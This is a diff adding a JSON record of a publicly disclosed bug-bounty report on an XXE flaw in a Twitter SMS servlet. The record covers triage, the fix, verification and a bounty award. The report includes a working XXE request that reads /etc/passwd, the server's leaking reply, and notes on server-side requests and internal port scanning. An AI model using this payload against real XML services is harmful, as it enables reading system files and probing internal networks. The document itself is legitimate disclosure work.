@@ -1,0 +1,445 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-07-19T22:09:14.561Z", 
+    "voters": [
+        "jokebookservice1", 
+        "jin", 
+        "flamezzz", 
+        "rc0r", 
+        "arneswinnen", 
+        "tomdev", 
+        "nirvana-msu", 
+        "rhynorater", 
+        "bl4de", 
+        "jr0ch17", 
+        "and 205 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "10080.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 248668, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-07-26T23:03:43.220Z", 
+    "vulnerability_information": "Hi team,\n\n##What type of issue are you reporting? Does it align to a CWE or OWASP issue?\nI've identified an XXE vulnerability in the cloudhopper sxmp servlet on sms-be-vip.twitter.com which discloses local files to an external attacker and allows web requests to be sent. This aligns to https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing\n\n\n##How does a user reproduce your issue?\nTo demonstrate the use of this vulnerability for arbitrary file read, I sent the following request:\n\n    POST /api/sxmp/1.0 HTTP/1.1\n    Host: sms-be-vip.twitter.com\n    Connection: close\n    Content-Type: text/xml\n    Content-Length: 481\n\n    <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n    <!DOCTYPE foo [  \n       <!ELEMENT foo ANY >\n       <!ENTITY file SYSTEM \"file:///etc/passwd\"> \n    ]>\n    <operation type=\"deliver\">\n    <account username=\"abc\" password=\"a\"/>\n    <deliverRequest referenceId=\"MYREF102020022\">\n    <operatorId>&file;</operatorId>\n    <sourceAddress type=\"network\">40404</sourceAddress>\n    <destinationAddress type=\"international\">123</destinationAddress>\n    <text encoding=\"ISO-8859-1\">a</text>\n    </deliverRequest>\n    </operation>\n    </code>\n\nIn response, the server returned its /etc/passwd file in an error message:\n\n    <?xml version=\"1.0\"?>\n    <operation type=\"deliver\">\n      <error code=\"1010\" message=\"Unable to convert [root:x:0:0:root:/root:/bin/bash...[truncated by researcher] to an integer for [operatorId]\"/>\n    </operation>\n\nIn addition to local file read, it was confirmed through testing that if \"file:///etc/passwd\" is replaced with a URL, the servlet will make external requests and that it has outbound access to the internet.\n\n##What is the impact of your issue?\nDepending on the trust relationships afforded to this host, XXE can be a viable candidate for pivoting to other related hosts It can be used to disclose sensitive files such as certificates and source from the target. This could expose some of the restricted functionality and capabilities of this host to the attacker. \n\n##What are some scenarios where an attacker would be able to leverage this vulnerability?\nAny remote attacker can utilise this vulnerability to read from the filesystem. On finding this host (indexed by Google and identifiable through certificate transparency logs, so an attacker can discover it without excessive effort, its functionality can be explored by identifying that the code it is running maps to code found on https://github.com/twitter/cloudhopper-commons\n\nIn this instance, if this were an isolated host with no opportunity to pivot, as an attacker I would investigate whether I could use file read to bypass the credential requirement which thwarted earlier attempts to interact with this service.\n\nIf this host contains API keys or certificates for access other Twitter properties, an attacker could leverage these to escalate their compromise. The web request functionality could also be utilised to port scan any internal hosts which this server has access to.\n\n##What would be your suggested fix?\nIf the servlet is not in use, remove it from the server. If it is in use, reduce the functionality of the XML parser such that entities are not resolved, outbound network traffic is disallowed and parameter expansion is disabled.\n\n##Conclusion\nI don't want to flood the report with stuff you're probably already well aware of, so let me know if you need more information and I'll leave it to y'all to determine how important this host is if attacked using this issue. Please advise if your severity rating policy requires me to demonstrate the full possible impact of the vulnerability, as I've terminated testing as early as possible to provide this advice and wait on your response.\n\nCheers,\n\nJosh Brodie", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "low", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "unchanged", 
+            "integrity": "none", 
+            "availability": "none"
+        }, 
+        "rating": "medium", 
+        "score": 5.3, 
+        "author_type": "Team"
+    }, 
+    "title": "XXE on sms-be-vip.twitter.com in SXMP Processor", 
+    "is_member_of_team?": null, 
+    "vote_count": 215, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-08-18T22:09:14.599Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$10,080", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-12T18:22:29.222Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-12T18:22:29.222Z", 
+            "actor": {
+                "username": "techdarko", 
+                "url": "/techdarko", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Medium (5.3)", 
+                "old_severity": null
+            }, 
+            "team_handle": "twitter", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 1829847, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-12T18:22:35.041Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-12T18:22:35.041Z", 
+            "actor": {
+                "username": "techdarko", 
+                "url": "/techdarko", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "twitter", 
+            "message": "Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!", 
+            "markdown_message": "<p>Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.</p>\n\n<p>Thank you for helping keep Twitter secure!</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 1829850, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-12T19:16:14.285Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-12T19:16:14.285Z", 
+            "actor": {
+                "username": "techdarko", 
+                "url": "/techdarko", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "twitter", 
+            "message": "This issue should now be fixed. Can you please verify?\n\nThank you for helping keep Twitter secure!", 
+            "markdown_message": "<p>This issue should now be fixed. Can you please verify?</p>\n\n<p>Thank you for helping keep Twitter secure!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1830010, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-12T20:53:42.370Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-12T20:53:42.370Z", 
+            "actor": {
+                "username": "joshbrodienz", 
+                "url": "/joshbrodienz", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/159/a64c5a092c2614d69b5ad94a4b87f79b5ffa7b26_medium.jpeg?1463444909"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "twitter", 
+            "message": "Nice quick fix! DOCTYPE declarations appear to be disallowed now. I don't have an alternative way of achieving XXE with this configuration option set. OWASP's XXE prevention cheat sheet notes that \"almost all XML entity attacks are prevented\" if DTDs are disabled, so I'll conduct further research on whether edge cases exist which may contribute to this noting \"almost all\" rather than \"all\" and ping your team if I find anything in future.\n\nWithout any such sorcery, I can confirm that this appears to be resolved. A defence in depth strategy would include further hardening beyond DTDs being rejected, but if I can't get past this first barrier I can't tell whether that's happened or not.", 
+            "markdown_message": "<p>Nice quick fix! DOCTYPE declarations appear to be disallowed now. I don&#39;t have an alternative way of achieving XXE with this configuration option set. OWASP&#39;s XXE prevention cheat sheet notes that &quot;almost all XML entity attacks are prevented&quot; if DTDs are disabled, so I&#39;ll conduct further research on whether edge cases exist which may contribute to this noting &quot;almost all&quot; rather than &quot;all&quot; and ping your team if I find anything in future.</p>\n\n<p>Without any such sorcery, I can confirm that this appears to be resolved. A defence in depth strategy would include further hardening beyond DTDs being rejected, but if I can&#39;t get past this first barrier I can&#39;t tell whether that&#39;s happened or not.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1830440, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-13T04:16:46.359Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-13T04:16:46.359Z", 
+            "actor": {
+                "username": "joshbrodienz", 
+                "url": "/joshbrodienz", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/159/a64c5a092c2614d69b5ad94a4b87f79b5ffa7b26_medium.jpeg?1463444909"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "twitter", 
+            "message": "Hi @techdarko,\n\nUnderstand if it's not possible, but I'd really appreciate if in assessing the severity of this report you could provide a little more context to me about the finding which an attacker could obtain but a tester can't due to invasiveness. \n\nIn particular, I'm very keen to know if this server or an identically configured server which further probing would have found is in use as a live SMS sending platform for Twitter and whether compromise of this device could expose Twitter 2FA codes. \n\nCheers!", 
+            "markdown_message": "<p>Hi <a href=\"/techdarko\">@techdarko</a>,</p>\n\n<p>Understand if it&#39;s not possible, but I&#39;d really appreciate if in assessing the severity of this report you could provide a little more context to me about the finding which an attacker could obtain but a tester can&#39;t due to invasiveness. </p>\n\n<p>In particular, I&#39;m very keen to know if this server or an identically configured server which further probing would have found is in use as a live SMS sending platform for Twitter and whether compromise of this device could expose Twitter 2FA codes. </p>\n\n<p>Cheers!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1831036, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-13T20:18:58.635Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-13T20:18:58.635Z", 
+            "actor": {
+                "username": "techdarko", 
+                "url": "/techdarko", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "twitter", 
+            "message": "Hi @joshbrodienz,\n\nIn this situation the impact was lessened by restrictions already in place on the system which limited the files accessible to the service account the access was occurring as. Additionally many paths and filenames were not reachable due to functionality restrictions in the XML parser and configuration used. As such, while this was a production system, no user or other highly sensitive information was accessible in our testing. This resulted in the severity score being reduced to medium.\n\nThanks!", 
+            "markdown_message": "<p>Hi <a href=\"/joshbrodienz\">@joshbrodienz</a>,</p>\n\n<p>In this situation the impact was lessened by restrictions already in place on the system which limited the files accessible to the service account the access was occurring as. Additionally many paths and filenames were not reachable due to functionality restrictions in the XML parser and configuration used. As such, while this was a production system, no user or other highly sensitive information was accessible in our testing. This resulted in the severity score being reduced to medium.</p>\n\n<p>Thanks!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1833782, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-13T22:11:13.830Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-13T22:11:13.830Z", 
+            "actor": {
+                "username": "joshbrodienz", 
+                "url": "/joshbrodienz", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/159/a64c5a092c2614d69b5ad94a4b87f79b5ffa7b26_medium.jpeg?1463444909"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "twitter", 
+            "message": "Cheers for the additional context! I'm going to go ahead and take it for granted that Twitter's security program is mature enough that the impact assessment has covered whether this box had access to interact with sensitive internal network locations, etc., and that this has already been factored in. Appreciate the quick attention to this case!", 
+            "markdown_message": "<p>Cheers for the additional context! I&#39;m going to go ahead and take it for granted that Twitter&#39;s security program is mature enough that the impact assessment has covered whether this box had access to interact with sensitive internal network locations, etc., and that this has already been factored in. Appreciate the quick attention to this case!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1834024, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-07-14T19:20:20.439Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-14T19:20:20.439Z", 
+            "actor": {
+                "url": "/twitter", 
+                "profile": {
+                    "name": "Twitter"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/061/e78ef26a3191adcabe7311daa107bd9e152d3b5c_medium.?1439954730"
+                }
+            }, 
+            "team_handle": "twitter", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "10080.0", 
+            "collaborator": {
+                "username": "joshbrodienz", 
+                "url": "/joshbrodienz"
+            }, 
+            "message": "Thanks again. As mentioned we\u2019ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.", 
+            "markdown_message": "<p>Thanks again. As mentioned we\u2019ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1836586, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-15T08:19:38.933Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-15T08:19:38.933Z", 
+            "actor": {
+                "username": "joshbrodienz", 
+                "url": "/joshbrodienz", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/159/a64c5a092c2614d69b5ad94a4b87f79b5ffa7b26_medium.jpeg?1463444909"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "twitter", 
+            "message": "Bounty is very much appreciated! Cheers, team.", 
+            "markdown_message": "<p>Bounty is very much appreciated! Cheers, team.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1837642, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "joshbrodienz", 
+                "url": "/joshbrodienz"
+            }, 
+            "created_at": "2017-07-19T21:05:43.384Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-19T21:05:43.384Z", 
+            "actor": {
+                "username": "techdarko", 
+                "url": "/techdarko", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "twitter", 
+            "message": "We consider this issue to be fixed now.\n\nThank you for helping keep Twitter secure!", 
+            "markdown_message": "<p>We consider this issue to be fixed now.</p>\n\n<p>Thank you for helping keep Twitter secure!</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1850963, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-19T22:09:14.577Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-19T22:09:14.577Z", 
+            "actor": {
+                "username": "joshbrodienz", 
+                "url": "/joshbrodienz", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/159/a64c5a092c2614d69b5ad94a4b87f79b5ffa7b26_medium.jpeg?1463444909"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "twitter", 
+            "first_to_agree": true, 
+            "message": "Hi team,\n\nCan we please disclose this report? I'm keen to put together a small write-up on this one.\n\nCheers,\n\nJosh Brodie", 
+            "markdown_message": "<p>Hi team,</p>\n\n<p>Can we please disclose this report? I&#39;m keen to put together a small write-up on this one.</p>\n\n<p>Cheers,</p>\n\n<p>Josh Brodie</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1851110, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-26T23:03:43.261Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-26T23:03:43.261Z", 
+            "actor": {
+                "username": "petrilli", 
+                "url": "/petrilli", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/157/270/bf908a4981688ee1ada05c3744ddcb18680c2029_medium.jpeg?1491431319"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "twitter", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1869662, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-26T23:03:43.337Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-26T23:03:43.337Z", 
+            "actor": {
+                "username": "petrilli", 
+                "url": "/petrilli", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/157/270/bf908a4981688ee1ada05c3744ddcb18680c2029_medium.jpeg?1491431319"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "twitter", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1869663, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "joshbrodienz", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/joshbrodienz", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/159/37248d88437f6a2ee4e7fda27fcbd3f9a0e7504a_small.jpeg?1463444909"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 54, 
+        "name": "XML External Entities (XXE)"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -41041558.37474567, 
+    "disclosed_at": "2017-07-26T23:03:43.309Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/248668", 
+    "created_at": "2017-07-12T11:21:47.251Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>Hi team,</p>\n\n<h2 id=\"what-type-of-issue-are-you-reporting-does-it-align-to-a-cwe-or-owasp-issue\">What type of issue are you reporting? Does it align to a CWE or OWASP issue?</h2>\n\n<p>I&#39;ve identified an XXE vulnerability in the cloudhopper sxmp servlet on sms-be-vip.twitter.com which discloses local files to an external attacker and allows web requests to be sent. This aligns to <a title=\"https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing\" href=\"/redirect?signature=f0bd575f52a8d401185bad46423e4d146d8fe80f&amp;url=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FXML_External_Entity_%28XXE%29_Processing\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing</span><i class=\"icon-external-link\"></i></a></p>\n\n<h2 id=\"how-does-a-user-reproduce-your-issue\">How does a user reproduce your issue?</h2>\n\n<p>To demonstrate the use of this vulnerability for arbitrary file read, I sent the following request:</p>\n<pre class=\"highlight plaintext\"><code>POST /api/sxmp/1.0 HTTP/1.1\nHost: sms-be-vip.twitter.com\nConnection: close\nContent-Type: text/xml\nContent-Length: 481\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;\n&lt;!DOCTYPE foo [  \n   &lt;!ELEMENT foo ANY &gt;\n   &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt; \n]&gt;\n&lt;operation type=&quot;deliver&quot;&gt;\n&lt;account username=&quot;abc&quot; password=&quot;a&quot;/&gt;\n&lt;deliverRequest referenceId=&quot;MYREF102020022&quot;&gt;\n&lt;operatorId&gt;&amp;file;&lt;/operatorId&gt;\n&lt;sourceAddress type=&quot;network&quot;&gt;40404&lt;/sourceAddress&gt;\n&lt;destinationAddress type=&quot;international&quot;&gt;123&lt;/destinationAddress&gt;\n&lt;text encoding=&quot;ISO-8859-1&quot;&gt;a&lt;/text&gt;\n&lt;/deliverRequest&gt;\n&lt;/operation&gt;\n&lt;/code&gt;\n</code></pre>\n<p>In response, the server returned its /etc/passwd file in an error message:</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot;?&gt;</span>\n<span class=\"nt\">&lt;operation</span> <span class=\"na\">type=</span><span class=\"s\">&quot;deliver&quot;</span><span class=\"nt\">&gt;</span>\n  <span class=\"nt\">&lt;error</span> <span class=\"na\">code=</span><span class=\"s\">&quot;1010&quot;</span> <span class=\"na\">message=</span><span class=\"s\">&quot;Unable to convert [root:x:0:0:root:/root:/bin/bash...[truncated by researcher] to an integer for [operatorId]&quot;</span><span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;/operation&gt;</span>\n</code></pre>\n<p>In addition to local file read, it was confirmed through testing that if &quot;file:///etc/passwd&quot; is replaced with a URL, the servlet will make external requests and that it has outbound access to the internet.</p>\n\n<h2 id=\"what-is-the-impact-of-your-issue\">What is the impact of your issue?</h2>\n\n<p>Depending on the trust relationships afforded to this host, XXE can be a viable candidate for pivoting to other related hosts It can be used to disclose sensitive files such as certificates and source from the target. This could expose some of the restricted functionality and capabilities of this host to the attacker. </p>\n\n<h2 id=\"what-are-some-scenarios-where-an-attacker-would-be-able-to-leverage-this-vulnerability\">What are some scenarios where an attacker would be able to leverage this vulnerability?</h2>\n\n<p>Any remote attacker can utilise this vulnerability to read from the filesystem. On finding this host (indexed by Google and identifiable through certificate transparency logs, so an attacker can discover it without excessive effort, its functionality can be explored by identifying that the code it is running maps to code found on <a title=\"https://github.com/twitter/cloudhopper-commons\" href=\"/redirect?signature=3858a55227f05022026c760c61c87f5f91fd968b&amp;url=https%3A%2F%2Fgithub.com%2Ftwitter%2Fcloudhopper-commons\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/twitter/cloudhopper-commons</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>In this instance, if this were an isolated host with no opportunity to pivot, as an attacker I would investigate whether I could use file read to bypass the credential requirement which thwarted earlier attempts to interact with this service.</p>\n\n<p>If this host contains API keys or certificates for access other Twitter properties, an attacker could leverage these to escalate their compromise. The web request functionality could also be utilised to port scan any internal hosts which this server has access to.</p>\n\n<h2 id=\"what-would-be-your-suggested-fix\">What would be your suggested fix?</h2>\n\n<p>If the servlet is not in use, remove it from the server. If it is in use, reduce the functionality of the XML parser such that entities are not resolved, outbound network traffic is disallowed and parameter expansion is disabled.</p>\n\n<h2 id=\"conclusion\">Conclusion</h2>\n\n<p>I don&#39;t want to flood the report with stuff you&#39;re probably already well aware of, so let me know if you need more information and I&#39;ll leave it to y&#39;all to determine how important this host is if attacked using this issue. Please advise if your severity rating policy requires me to demonstrate the full possible impact of the vulnerability, as I&#39;ve terminated testing as early as possible to provide this advice and wait on your response.</p>\n\n<p>Cheers,</p>\n\n<p>Josh Brodie</p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://twitter.com", 
+            "about": "Twitter helps you create and share ideas and information instantly, without barriers.", 
+            "twitter_handle": "twittersecurity", 
+            "name": "Twitter"
+        }, 
+        "handle": "twitter", 
+        "url": "https://hackerone.com/twitter", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/061/4acfe72859c5e9cb48a152edb4e498e13fa28df2_small.?1439954730", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/061/e78ef26a3191adcabe7311daa107bd9e152d3b5c_medium.?1439954730"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 61, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
